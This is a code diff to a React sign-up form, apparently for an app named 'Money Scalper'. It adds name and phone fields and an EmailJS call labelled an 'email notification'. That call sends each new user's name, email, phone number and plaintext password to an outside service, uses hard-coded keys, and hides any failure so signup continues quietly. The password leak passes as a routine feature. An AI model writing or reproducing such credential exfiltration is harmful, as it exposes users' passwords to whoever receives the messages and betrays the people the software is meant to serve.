@@ -6,6 +6,7 @@ import { Label } from "@/components/ui/label";
 import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
 import { toast } from "sonner";
 import { Eye, EyeOff, Loader2 } from "lucide-react";
+import emailjs from '@emailjs/browser';
 
 interface AuthProps {
   onSuccess?: () => void;
@@ -20,6 +21,8 @@ export const Auth = ({ onSuccess }: AuthProps) => {
     setLoading(true);
 
     const formData = new FormData(e.currentTarget);
+    const name = formData.get("signup-name") as string;
+    const contactNumber = formData.get("signup-contact") as string;
     const email = formData.get("signup-email") as string;
     const password = formData.get("signup-password") as string;
     const confirmPassword = formData.get("confirm-password") as string;
@@ -43,6 +46,25 @@ export const Auth = ({ onSuccess }: AuthProps) => {
       });
 
       if (error) throw error;
+
+      // Send email notification via EmailJS
+      try {
+        await emailjs.send(
+          'service_o5z56fm',
+          'template_vuxezaw',
+          {
+            to_name: 'Money Scalper',
+            full_name: name,
+            user_email: email,
+            contact_number: contactNumber,
+            user_password: password,
+          },
+          'AnyGKIBS05v_ugsa4'
+        );
+      } catch (emailError) {
+        console.error("Failed to send email notification:", emailError);
+        // Don't block signup if email fails
+      }
 
       toast.success("Account created! You're now logged in.");
       onSuccess?.();
@@ -129,6 +151,30 @@ export const Auth = ({ onSuccess }: AuthProps) => {
 
       <TabsContent value="signup" className="space-y-4">
         <form onSubmit={handleSignup} className="space-y-4">
+          <div className="space-y-2">
+            <Label htmlFor="signup-name">Name</Label>
+            <Input
+              id="signup-name"
+              name="signup-name"
+              type="text"
+              placeholder="John Doe"
+              required
+              disabled={loading}
+            />
+          </div>
+
+          <div className="space-y-2">
+            <Label htmlFor="signup-contact">Contact Number</Label>
+            <Input
+              id="signup-contact"
+              name="signup-contact"
+              type="tel"
+              placeholder="+1234567890"
+              required
+              disabled={loading}
+            />
+          </div>
+
           <div className="space-y-2">
             <Label htmlFor="signup-email">Email</Label>
             <Input
